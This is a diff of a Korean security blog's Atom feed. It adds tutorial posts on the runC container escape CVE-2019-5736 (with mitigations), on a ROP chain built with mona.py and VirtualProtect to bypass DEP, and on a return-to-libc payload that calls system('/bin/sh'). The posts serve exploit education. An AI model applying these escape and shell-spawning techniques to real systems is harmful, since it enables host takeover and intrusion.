@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-25T05:12:58+09:00</updated><id>/</id><title type="html">LIN ARENA</title><subtitle>LIN ARENA Technology Blog</subtitle><entry><title type="html">web-0x03</title><link href="/web-0x03" rel="alternate" type="text/html" title="web-0x03" /><published>2019-03-25T14:00:00+09:00</published><updated>2019-03-25T14:00:00+09:00</updated><id>/web-0x03</id><content type="html" xml:base="/web-0x03">&lt;h1 id=&quot;cve-2018-9034-1day-test&quot;&gt;CVE-2018-9034 1Day Test&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-25T05:17:31+09:00</updated><id>/</id><title type="html">LIN ARENA</title><subtitle>LIN ARENA Technology Blog</subtitle><entry><title type="html">web-0x03</title><link href="/web-0x03" rel="alternate" type="text/html" title="web-0x03" /><published>2019-03-25T14:00:00+09:00</published><updated>2019-03-25T14:00:00+09:00</updated><id>/web-0x03</id><content type="html" xml:base="/web-0x03">&lt;h1 id=&quot;cve-2018-9034-1day-test&quot;&gt;CVE-2018-9034 1Day Test&lt;/h1&gt;
 
 &lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;
 
@@ -96,7 +96,952 @@ https://ppbuz.com/8644&lt;br /&gt;
 https://nvd.nist.gov/vuln/detail/CVE-2018-9034&lt;br /&gt;
 https://pluginarchive.com/wordpress/relevanssi/v/4-0-4&lt;br /&gt;
 https://downloads.wordpress.org/plugin/relevanssi.4.0.4.zip&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>hackyu</name></author><category term="Posts" /><summary type="html">CVE-2018-9034 1Day Test</summary></entry><entry><title type="html">linux_0x03</title><link href="/linux_0x03" rel="alternate" type="text/html" title="linux_0x03" /><published>2019-03-11T19:18:00+09:00</published><updated>2019-03-11T19:18:00+09:00</updated><id>/linux_0x03</id><content type="html" xml:base="/linux_0x03">&lt;h2 id=&quot;0x03---basic-bof--메모리-보호-기법&quot;&gt;0x03 - Basic BOF &amp;amp; 메모리 보호 기법&lt;/h2&gt;
+&lt;/ul&gt;</content><author><name>hackyu</name></author><category term="Posts" /><summary type="html">CVE-2018-9034 1Day Test</summary></entry><entry><title type="html">CVE-2019-5736 (runC Container 취약점)</title><link href="/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" /><published>2019-03-25T09:29:00+09:00</published><updated>2019-03-25T09:29:00+09:00</updated><id>/runC%20Container</id><content type="html" xml:base="/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;
+
+&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;
+
+&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
+공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;
+
+&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;
+
+&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다.&lt;/p&gt;
+
+&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;
+
+&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;
+
+&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;
+
+&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server(이하 HS라 하겠습니다.)&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;첫 번째 방법 부터 보도록 하죠. 진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;HS&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
+다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;HS&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;
+
+&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;HS&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;
+
+&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
+전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;…..&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;
+
+&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;
+
+&lt;p&gt;감사합니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
+  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
+  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
+  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
+  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
+  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
+  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
+  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
+  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">CVE-2019-5736 (runC Container 취약점)</summary></entry><entry><title type="html">windows-0x09</title><link href="/windows-0x09" rel="alternate" type="text/html" title="windows-0x09" /><published>2019-03-24T20:18:00+09:00</published><updated>2019-03-24T20:18:00+09:00</updated><id>/windows-0x09</id><content type="html" xml:base="/windows-0x09">&lt;h1 id=&quot;0x09-dep3&quot;&gt;0x09 DEP(3)&lt;/h1&gt;
+
+&lt;p&gt;이번 시간에는 DEP의 마지막 주제인 ROP에 대해서 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;rop-return-oriented-programming&quot;&gt;ROP (Return Oriented Programming)&lt;/h5&gt;
+
+&lt;p&gt;ROP는 Gadget으로 Chain을 구성하여 API를 호출하는 방식의 공격 기법입니다.&lt;/p&gt;
+
+&lt;p&gt;주로 VirtualProtect()나 SetProcessDEPPolicy() 등 메모리와 관련된 함수들을 호출하며,&lt;/p&gt;
+
+&lt;p&gt;Shellcode를 실행할 수 있도록 실행 권한을 추가하는 방향으로 진행됩니다.&lt;/p&gt;
+
+&lt;p&gt;이번 연재에서는 가장 흔하고 쉬운 방식인 VirtualProtect() API를 호출해서 DEP를 우회하도록 하겠습니다.&lt;/p&gt;
+
+&lt;h6 id=&quot;virtualprotect-함수&quot;&gt;VirtualProtect 함수&lt;/h6&gt;
+
+&lt;p&gt;VirtualProtect는 4개의 인자를 가지며, 특정 메모리 영역의 실행 권한을 변경해주는 함수입니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL WINAPI VirtualProtect (
+		_In_ LPVOID lpAddress, 		 # 권한을 변경할 메모리 영역의 시작 주소
+		_In_ SIZE_T dwSize,	   		 # 변경할 크기
+		_In_ flNewProtect,     		 # 변경할 속성 값
+		_Out_ PDWORD lpflOldProtect, # 이전 값 저장 (쓰기 가능한 영역)
+	);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;VirtualProtect 함수는 변경을 원하는 메모리 영역의 시작 주소를 기준으로 원하는 크기만큼 실행 권한을 변경해줍니다.&lt;/p&gt;
+
+&lt;p&gt;그럼 ShellCode를 넣어둔 뒤, 그 크기만큼 실행 권한을 주면 되겠네요.&lt;/p&gt;
+
+&lt;p&gt;이 내용을 STACK으로 구성하면 다음과 같습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;그림처럼 STACK을 구성할 경우, VirtualProtect()가 호출되어 ShellCode가 들어있는 메모리 주소에 실행 권한이 생길 것이고,&lt;/p&gt;
+
+&lt;p&gt;다음 RET에서 JMP ESP가 호출되어 ShellCode가 실행될 것 입니다.&lt;/p&gt;
+
+&lt;p&gt;그리고 이 모양의 STACK을 구성하기 위해 PUSHAD 명령어를 이용할 것 입니다. STACK 구성이 좀 더 쉽겠죠?&lt;/p&gt;
+
+&lt;h5 id=&quot;payload-구성&quot;&gt;PAYLOAD 구성&lt;/h5&gt;
+
+&lt;p&gt;Mona.py를 이용해서 ROP Chain 구성에 사용할 Gadget들을 찾아 보겠습니다. ( !mona modules )&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Gadget은 위의 Module들 중에 ASLR이 적용되어 있지 않은 example.dll에서 가져다 쓰면 되겠네요.&lt;/p&gt;
+
+&lt;p&gt;이제 여기서 Gadget을 구해서 값들을 맞춰주기만 하면 되는데,,, 일일이 하나씩 찾아서 넣으면 엄청나게 많은 시간이 소요되겠죠??&lt;/p&gt;
+
+&lt;p&gt;하나하나 다 찾아다닐 시간은 없으니까 mona.py에서 제공하는 기능을 활용하겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona rop -m example
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이 명령어를 사용하면 mona.py에서 자동으로 rop 공격에 필요한 Gadget들을 example.dll에서 찾아 파일로 생성해줍니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;여러 언어에 맞게 추천을 해주는데 여러분 환경에 맞는 값을 사용하시면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;이제 필요한 Gadget들을 아주 손쉽게 찾아왔는데 한 가지 생각해야 할 점이 있습니다.&lt;/p&gt;
+
+&lt;p&gt;바로 VirtualProtect의 함수 주소입니다.&lt;/p&gt;
+
+&lt;p&gt;ASLR이 적용되어 있으면 Window API 함수들의 주소도 계속해서 변할텐데 어떻게 주소를 가지고 올 수 있는 걸까요?&lt;/p&gt;
+
+&lt;p&gt;Gadget 파일을 잘 보시면 VirtualProtect에 IAT라고 적혀있는 것을 보실 수 있을 겁니다.&lt;/p&gt;
+
+&lt;p&gt;IAT(Import Address Table)는 프로그램에서 사용되는 라이브러리에서 어떤 함수들을 사용하고 있는지, 그 함수들의 정보를 기술한 테이블입니다.&lt;/p&gt;
+
+&lt;p&gt;아래와 같이 example.dll의 IAT를 살펴보면 우리가 사용하고자 하는 VirtualProtect() 함수의 정보가 들어있는 것을 확인하실 수 있습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;이렇게 VirtualProtect() 정보가 들어 있는 경우에는 IAT 값에서 시작 주소를 가져다가 쓰면 되는 것이죠.&lt;/p&gt;
+
+&lt;p&gt;없다면? 동적으로 찾아오도록 Gadget을 구성하면 됩니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;null-byte-제거&quot;&gt;Null Byte 제거&lt;/h5&gt;
+
+&lt;p&gt;공격을 성공적으로 하기 위해 Payload에 존재하는 Null Byte들을 제거해줘야겠죠?&lt;/p&gt;
+
+&lt;p&gt;mona가 만들어 준 값들엔 Null Byte가 존재해서 Payload 전달이 완전하게 이루어지지 않는답니다.&lt;/p&gt;
+
+&lt;p&gt;그래서 다음과 같이 수정을 했습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;먼저, 0x201, 0x40 같은 값을 넣어줘야 하는데 Null이 존재하므로 0xfffffdff, 0xffffffc0를 넣고 neg를 사용해서 값을 생성해줬습니다.&lt;/p&gt;
+
+&lt;p&gt;그리고 Gadget 주소 중에 Null이 존재하는 것은 다른 Gadget 찾아서 교체해준 내용입니다.&lt;/p&gt;
+
+&lt;p&gt;mona만 믿고 Payload를 구성하시면 안됩니다. 잘 살펴보고 Null은 반드시 제거해주셔야 합니다.&lt;/p&gt;
+
+&lt;p&gt;이어서 DBG로 살펴보면 다음과 같습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;strcpy가 실행되고 나서의 모습입니다. 각 Gadget들이 연속해서 실행된 뒤, VirtualProtect() 함수가 실행될 것이고,&lt;/p&gt;
+
+&lt;p&gt;마지막에 JMP ESP가 실행되면서 ShellCode가 실행되겠네요.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;잘 실행되네요^^&lt;/p&gt;
+
+&lt;p&gt;지금까지 DEP에 대해서 알아봤습니다.&lt;/p&gt;
+
+&lt;p&gt;다음 연재부터는 Heap Exploit으로 찾아뵙도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x09 DEP(3)</summary></entry><entry><title type="html">linux_0x04</title><link href="/linux_0x04" rel="alternate" type="text/html" title="linux_0x04" /><published>2019-03-24T15:18:00+09:00</published><updated>2019-03-24T15:18:00+09:00</updated><id>/linux_0x04</id><content type="html" xml:base="/linux_0x04">&lt;h2 id=&quot;rtlreturn-to-library&quot;&gt;RTL(Return to Library)&lt;/h2&gt;
+
+&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다!&lt;/p&gt;
+
+&lt;p&gt;이번에 알아볼 내용은 &lt;strong&gt;RTL&lt;/strong&gt;(Return to Library)입니다.
+먼저 &lt;strong&gt;RTL&lt;/strong&gt;이 뭔지를 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;rtlreturn-to-library-1&quot;&gt;RTL(Return to Library)&lt;/h1&gt;
+
+&lt;p&gt;지난 포스팅에서 &lt;strong&gt;메모리 보호 기법&lt;/strong&gt;에 대해 간단하게 봤습니다. 그 중 &lt;strong&gt;ASLR&lt;/strong&gt;은 봤고 &lt;strong&gt;DEP/NX bit&lt;/strong&gt;는 언급만 하고 넘어갔었죠. &lt;strong&gt;메모리 내부에서 코드실행을 방지&lt;/strong&gt;하기 위한 메모리 보호 기법 중 하나라고 알려 드렸습니다.&lt;/p&gt;
+
+&lt;p&gt;메모리에서의 코드 실행이 막혔기 때문에(Shellcode 실행 차단) 다른 방법을 찾아야 합니다. &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 직접 실행할 수 있다면 가능할 듯 합니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-1.png&quot; alt=&quot;[그림 4-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;그럼 어떻게 해야할까요? 첫 포스팅에서 메모리 구조를 설명 드릴 때 위 그림을 보여 드렸었습니다.&lt;strong&gt;[스택 -&lt;/strong&gt; &lt;strong&gt;공유라이브러리 -&lt;/strong&gt; &lt;strong&gt;힙 - BSS/Data - Code]&lt;/strong&gt;으로 이뤄지며, 공유 라이브러리는 &lt;strong&gt;메모리에 미리 필요한 중요 함수들을 저장해두는 장소&lt;/strong&gt;라고 간단하게 설명 드렸었죠.
+저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;를 사용하여 &lt;strong&gt;/bin/sh&lt;/strong&gt;을 실행할 수 있지 않을까???라는 생각으로 &lt;strong&gt;RTL&lt;/strong&gt;이 연구되었다 생각되네요….(&lt;strong&gt;뇌피셜)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;공유 라이버르러리를 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;여러 프로세스에서 동시에 사용 가능한 라이브러리&lt;/li&gt;
+  &lt;li&gt;프로그램이 시작될 때 메모리에 적재됨&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;우리는 저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt; 중에서 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하겠습니다. 해당 함수는 입력받은 문자열을 실행시키는 함수입니다. 즉, 인자값으로 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 입력한다면 &lt;strong&gt;system(“/bin/sh”);&lt;/strong&gt;과 같은 형태가 되며 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 실행하게 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-2.png&quot; alt=&quot;[그림 4-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;RTL&lt;/strong&gt;의 흐름을 위와 같이 표현했습니다. &lt;strong&gt;libc&lt;/strong&gt;(공유라이브러리)의 함수(&lt;strong&gt;system()&lt;/strong&gt;)를 사용해서 &lt;strong&gt;8byte&lt;/strong&gt; 뒤에 &lt;strong&gt;/bin/sh&lt;/strong&gt; 의 주소를 박아두면 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 실행하여 &lt;strong&gt;shell&lt;/strong&gt;을 따내게 됩니다. 
+즉, &lt;strong&gt;버퍼 + sfp + system() + AAAA + /bin/sh&lt;/strong&gt; 처럼 표현 가능할 듯 합니다.&lt;/p&gt;
+
+&lt;p&gt;여기서 왜 &lt;strong&gt;system()&lt;/strong&gt; 뒤에 인자값으로 바로 &lt;strong&gt;/bin/sh/&lt;/strong&gt;가 아닌 잉여값 “&lt;strong&gt;AAAA&lt;/strong&gt;“을 입력할까요? 그냥 바로 인자값을 입력하면 인식을 못할까요?&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-3.png&quot; alt=&quot;[그림 4-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;system(“/bin/sh”)&lt;/strong&gt; 이 입력된 상태에서 함수가 종료되면 에필로그 과정을 가집니다. 에필로그 과정 중 ret(pop eip) 과정을 거치며 system() 함수의 주소를 eip에  옮기게 되죠. 이 과정에 pop 명령을 사용 했기에 스택에 공간이 생깁니다.(가운데) 그런 다음 system() 함수의 프롤로그 과정을 가지며 push ebp, mov ebp, esp 과정을 거치며 새롭게 메모리의 영역을 확보하죠. 
+즉, AAAA의 위치는 system 함수가 끝난 뒤의 ret 구역이 되며 잉여값을 배치해주고, 다음 공간에 원하는 주소값을 위치시켜 줍니다. 좀더 확실하게 알아보도록 하죠. (참고로 root로 생성된 실행파일은 디버깅이 안되니 /tmp/ 하위에 다른 폴더로 복사해서 분석해주세요!!)&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-4.png&quot; alt=&quot;[그림 4-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 사진에서와 같이 system() 내부를 들여다 보면 프로로그 과정을 거치고 EBP에서 8byte 떨어진 주소를 참조합니다. EBP에서 4byte를 가지고 우리는 남은 4byte만(RET) 채워준 뒤 원하는 주소를 입력해준다면 인자값을 정상적으로 인식하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Return to Library&lt;/strong&gt;라는 이름을 아주 성실하게 이행하는 모습이네요. 그럼 직접 시작해보곘습니다. 먼저 찾아야 할 주소는 아래와 같습니다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;1번 system 주소부터 확인 하도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-5.png&quot; alt=&quot;[그림 4-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;먼저 브레이크를 main 함수에 잡아주고 구동 시킵니다.bp에 멈추고 나면 print 명령을 사용해 system()의 주소를 확인 하시면 됩니다.(system의 주소를 못 찾는 심볼을 찾을수 없다는 에러가 뜨는 경우 static 옵션을 뺴고 컴파일 해주세요….개고생 했습니다…..)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+&lt;/ol&gt;
+
